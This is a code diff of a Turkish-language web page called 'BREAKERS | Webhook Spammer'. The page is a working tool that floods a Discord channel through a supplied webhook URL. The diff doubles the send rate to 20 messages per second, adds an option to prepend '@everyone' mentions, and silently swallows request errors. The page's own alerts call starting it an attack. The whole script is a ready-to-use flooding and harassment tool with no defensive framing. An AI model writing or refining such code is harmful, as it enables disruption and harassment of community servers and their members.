@@ -1,239 +1,293 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BREAKERS | Webhook Spammer</title>
-    <style>
-        :root {
-            --primary-gold: #f5c862;
-            --error-red: #ff4d4d;
-            --accent-blue: #00d4ff;
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BREAKERS | Webhook Spammer</title>
+    <style>
+        :root {
+            --primary-gold: #f5c862;
+            --error-red: #ff4d4d;
+            --accent-blue: #00d4ff;
+        }
 
-        body {
-            margin: 0; padding: 0;
-            font-family: 'Segoe UI', sans-serif;
-            color: white;
-            /* Arka Plan Fix: Yüksek kaliteli Kuru Kafa teması */
-            background: #050505 url('https://images.alphacoders.com/134/1341051.png') no-repeat center center fixed;
-            background-size: cover;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Segoe UI', sans-serif;
+            color: white;
+            background: #050505 url('https://images.alphacoders.com/134/1341051.png') no-repeat center center fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
 
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.8) 100%);
-            z-index: 1;
-        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.8) 100%);
+            z-index: 1;
+        }
 
-        .container {
-            position: relative;
-            z-index: 10;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(20px);
-            padding: 35px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            width: 420px;
-            text-align: center;
-            box-shadow: 0 0 40px rgba(0,0,0,1);
-        }
+        .container {
+            position: relative;
+            z-index: 10;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(20px);
+            padding: 35px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 420px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(0,0,0,1);
+        }
 
-        h1 { 
-            color: var(--primary-gold); 
-            margin: 0 0 15px 0; 
-            font-size: 2.5rem; 
-            letter-spacing: 6px;
-            text-shadow: 0 0 15px rgba(245, 200, 98, 0.5);
-        }
+        h1 { 
+            color: var(--primary-gold); 
+            margin: 0 0 15px 0; 
+            font-size: 2.5rem; 
+            letter-spacing: 6px;
+            text-shadow: 0 0 15px rgba(245, 200, 98, 0.5);
+        }
 
-        /* PP Sistemi Fixlendi */
-        .pp-section {
-            background: rgba(255,255,255,0.05);
-            border: 2px dashed rgba(245, 200, 98, 0.3);
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 15px;
-            transition: 0.3s;
-        }
+        .pp-section {
+            background: rgba(255,255,255,0.05);
+            border: 2px dashed rgba(245, 200, 98, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+            transition: 0.3s;
+        }
 
-        .pp-section:hover { border-color: var(--primary-gold); }
+        .pp-section:hover { border-color: var(--primary-gold); }
 
-        #pp-preview {
-            width: 60px; height: 60px;
-            border-radius: 50%;
-            margin: 0 auto 10px;
-            display: none;
-            object-fit: cover;
-            border: 2px solid var(--primary-gold);
-        }
+        #pp-preview {
+            width: 60px; height: 60px;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            display: none;
+            object-fit: cover;
+            border: 2px solid var(--primary-gold);
+        }
 
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 6px 0;
-            background: rgba(20, 20, 20, 0.8);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 8px;
-            color: white;
-            box-sizing: border-box;
-            transition: 0.3s;
-        }
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            background: rgba(20, 20, 20, 0.8);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 8px;
+            color: white;
+            box-sizing: border-box;
+            transition: 0.3s;
+            font-family: inherit;
+        }
 
-        input:focus { outline: none; border-color: var(--primary-gold); }
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
 
-        /* Buton Hover Efektleri */
-        .btn-group { display: flex; gap: 12px; margin-top: 20px; }
-        
-        button {
-            flex: 1;
-            padding: 14px;
-            border: none;
-            border-radius: 8px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-        }
+        input:focus, textarea:focus { outline: none; border-color: var(--primary-gold); }
 
-        #startBtn { 
-            background: transparent; 
-            color: var(--primary-gold); 
-            border: 1px solid var(--primary-gold);
-        }
-        #startBtn:hover { 
-            background: var(--primary-gold); 
-            color: black; 
-            box-shadow: 0 0 25px rgba(245, 200, 98, 0.6);
-        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+            font-size: 0.9rem;
+            justify-content: center;
+        }
 
-        #stopBtn { 
-            background: transparent; 
-            color: var(--error-red); 
-            border: 1px solid var(--error-red);
-        }
-        #stopBtn:hover { 
-            background: var(--error-red); 
-            color: white; 
-            box-shadow: 0 0 25px rgba(255, 77, 77, 0.5);
-        }
+        .checkbox-group input {
+            width: auto;
+            margin: 0;
+            transform: scale(1.2);
+        }
 
-        #alertBox {
-            position: fixed;
-            top: 25px; right: -400px;
-            padding: 15px 30px;
-            border-radius: 10px;
-            z-index: 1000;
-            transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            font-weight: bold;
-        }
+        .btn-group { display: flex; gap: 12px; margin-top: 20px; }
+        
+        button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
 
-        .creator {
-            position: absolute;
-            bottom: 15px; left: 20px;
-            font-size: 0.8rem;
-            color: rgba(255,255,255,0.3);
-            font-style: italic;
-        }
-    </style>
+        #startBtn { 
+            background: transparent; 
+            color: var(--primary-gold); 
+            border: 1px solid var(--primary-gold);
+        }
+        #startBtn:hover { 
+            background: var(--primary-gold); 
+            color: black; 
+            box-shadow: 0 0 25px rgba(245, 200, 98, 0.6);
+        }
+
+        #stopBtn { 
+            background: transparent; 
+            color: var(--error-red); 
+            border: 1px solid var(--error-red);
+        }
+        #stopBtn:hover { 
+            background: var(--error-red); 
+            color: white; 
+            box-shadow: 0 0 25px rgba(255, 77, 77, 0.5);
+        }
+
+        #alertBox {
+            position: fixed;
+            top: 25px; right: -400px;
+            padding: 15px 30px;
+            border-radius: 10px;
+            z-index: 1000;
+            transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            font-weight: bold;
+        }
+
+        .creator {
+            position: absolute;
+            bottom: 15px; left: 20px;
+            font-size: 0.8rem;
+            color: rgba(255,255,255,0.3);
+            font-style: italic;
+        }
+
+        .info {
+            font-size: 0.7rem;
+            margin-top: 12px;
+            opacity: 0.6;
+        }
+    </style>
 </head>
 <body>
 
-    <div id="alertBox"></div>
-    <div class="creator">dkrsnlq</div>
+    <div id="alertBox"></div>
+    <div class="creator">dkrsnlq</div>
 
-    <div class="container">
-        <h1>BREAKERS</h1>
-        
-        <div class="pp-section" id="drop-zone">
-            <img id="pp-preview" src="">
-            <p id="pp-text" style="font-size: 0.75rem; margin: 0 0 8px 0; opacity: 0.6;">FOTOĞRAFI SÜRÜKLE VEYA LİNK GİR</p>
-            <input type="text" id="avatarUrl" placeholder="Profil Fotoğrafı Linki" style="font-size: 0.7rem; padding: 8px;">
-        </div>
+    <div class="container">
+        <h1>BREAKERS</h1>
+        
+        <div class="pp-section" id="drop-zone">
+            <img id="pp-preview" src="">
+            <p id="pp-text" style="font-size: 0.75rem; margin: 0 0 8px 0; opacity: 0.6;">FOTOĞRAFI SÜRÜKLE VEYA LİNK GİR</p>
+            <input type="text" id="avatarUrl" placeholder="Profil Fotoğrafı Linki" style="font-size: 0.7rem; padding: 8px;">
+        </div>
 
-        <input type="text" id="webhookUrl" placeholder="Webhook URL">
-        <input type="text" id="username" placeholder="Webhook İsmi">
-        <input type="text" id="message" placeholder="Mesajınız">
+        <input type="text" id="webhookUrl" placeholder="Webhook URL (discord.com/api/webhooks/...)" spellcheck="false">
+        <input type="text" id="username" placeholder="Webhook İsmi (opsiyonel)">
+        <textarea id="message" placeholder="Mesajınız"></textarea>
 
-        <div class="btn-group">
-            <button id="startBtn" onclick="startSpam()">BAŞLAT</button>
-            <button id="stopBtn" onclick="stopSpam()">DURDUR</button>
-        </div>
-    </div>
+        <div class="checkbox-group">
+            <input type="checkbox" id="everyoneMention">
+            <label for="everyoneMention">@everyone ekle (spam)</label>
+        </div>
 
-    <script>
-        let spamInterval = null;
-        let droppedImg = "";
-        const dropZone = document.getElementById('drop-zone');
+        <div class="btn-group">
+            <button id="startBtn" onclick="startSpam()">BAŞLAT</button>
+            <button id="stopBtn" onclick="stopSpam()">DURDUR</button>
+        </div>
+        <div class="info">⚡ 20 mesaj/saniye hızında gönderir. Webhook'lar Discord tarafından sınırlanabilir.</div>
+    </div>
 
-        // PP Sürükle Bırak Fix
-        dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.style.background = "rgba(245, 200, 98, 0.1)"; });
-        dropZone.addEventListener('dragleave', () => { dropZone.style.background = "transparent"; });
-        dropZone.addEventListener('drop', (e) => {
-            e.preventDefault();
-            const file = e.dataTransfer.files[0];
-            if (file && file.type.startsWith('image/')) {
-                const reader = new FileReader();
-                reader.onload = (ev) => {
-                    droppedImg = ev.target.result;
-                    const preview = document.getElementById('pp-preview');
-                    preview.src = droppedImg;
-                    preview.style.display = 'block';
-                    document.getElementById('pp-text').innerText = "FOTOĞRAF HAZIR";
-                };
-                reader.readAsDataURL(file);
-            }
-        });
+    <script>
+        let spamInterval = null;
+        let droppedImg = "";
+        const dropZone = document.getElementById('drop-zone');
 
-        function showAlert(msg, type) {
-            const box = document.getElementById('alertBox');
-            box.innerText = msg;
-            box.style.backgroundColor = type === 'success' ? '#2ecc71' : '#e74c3c';
-            box.style.right = '25px';
-            setTimeout(() => { box.style.right = '-400px'; }, 3000);
-        }
+        // PP Sürükle Bırak
+        dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.style.background = "rgba(245, 200, 98, 0.1)"; });
+        dropZone.addEventListener('dragleave', () => { dropZone.style.background = "transparent"; });
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            const file = e.dataTransfer.files[0];
+            if (file && file.type.startsWith('image/')) {
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    droppedImg = ev.target.result;
+                    const preview = document.getElementById('pp-preview');
+                    preview.src = droppedImg;
+                    preview.style.display = 'block';
+                    document.getElementById('pp-text').innerText = "FOTOĞRAF HAZIR";
+                };
+                reader.readAsDataURL(file);
+            }
+        });
 
-        async function startSpam() {
-            const url = document.getElementById('webhookUrl').value;
-            const msg = document.getElementById('message').value;
-            const user = document.getElementById('username').value;
-            const linkImg = document.getElementById('avatarUrl').value;
+        function showAlert(msg, type) {
+            const box = document.getElementById('alertBox');
+            box.innerText = msg;
+            box.style.backgroundColor = type === 'success' ? '#2ecc71' : '#e74c3c';
+            box.style.right = '25px';
+            setTimeout(() => { box.style.right = '-400px'; }, 3000);
+        }
 
-            if (!url.includes('discord.com/api/webhooks')) { showAlert("Webhook geçersiz!", "error"); return; }
-            if (!msg) { showAlert("Mesaj yazmadın kanka!", "error"); return; }
+        async function sendWebhookMessage(url, username, avatar, content) {
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: content,
+                        username: username || "BREAKERS",
+                        avatar_url: avatar || ""
+                    })
+                });
+            } catch (e) {
+                // sessiz başarısız
+            }
+        }
 
-            if (spamInterval) return;
-            showAlert("Saldırı Başlatıldı!", "success");
+        async function startSpam() {
+            let url = document.getElementById('webhookUrl').value.trim();
+            const msg = document.getElementById('message').value;
+            const user = document.getElementById('username').value.trim();
+            const linkImg = document.getElementById('avatarUrl').value.trim();
+            const addEveryone = document.getElementById('everyoneMention').checked;
 
-            spamInterval = setInterval(async () => {
-                try {
-                    await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: msg,
-                            username: user || "BREAKERS",
-                            avatar_url: droppedImg || linkImg || ""
-                        })
-                    });
-                } catch (e) {}
-            }, 100);
-        }
+            // Webhook doğrulama
+            if (!url) { showAlert("Webhook URL boş!", "error"); return; }
+            if (!url.includes('discord.com/api/webhooks')) { showAlert("Geçersiz webhook URL'si!", "error"); return; }
+            if (!msg) { showAlert("Mesaj yazmadın!", "error"); return; }
 
-        function stopSpam() {
-            if (spamInterval) {
-                clearInterval(spamInterval);
-                spamInterval = null;
-                showAlert("Saldırı Durduruldu.", "error");
-            }
-        }
-    </script>
+            if (spamInterval) {
+                showAlert("Zaten spam aktif!", "error");
+                return;
+            }
+
+            // Mesaj hazırlama
+            let finalMessage = msg;
+            if (addEveryone) {
+                finalMessage = "@everyone " + finalMessage;
+            }
+
+            const avatar = droppedImg || linkImg || "";
+
+            showAlert("Saldırı başlatıldı! (20 msg/sn)", "success");
+
+            // 50ms = 20 mesaj/saniye
+            spamInterval = setInterval(() => {
+                sendWebhookMessage(url, user, avatar, finalMessage);
+            }, 50);
+        }
+
+        function stopSpam() {
+            if (spamInterval) {
+                clearInterval(spamInterval);
+                spamInterval = null;
+                showAlert("Saldırı durduruldu.", "error");
+            } else {
+                showAlert("Aktif spam yok.", "error");
+            }
+        }
+    </script>
 </body>
 </html>
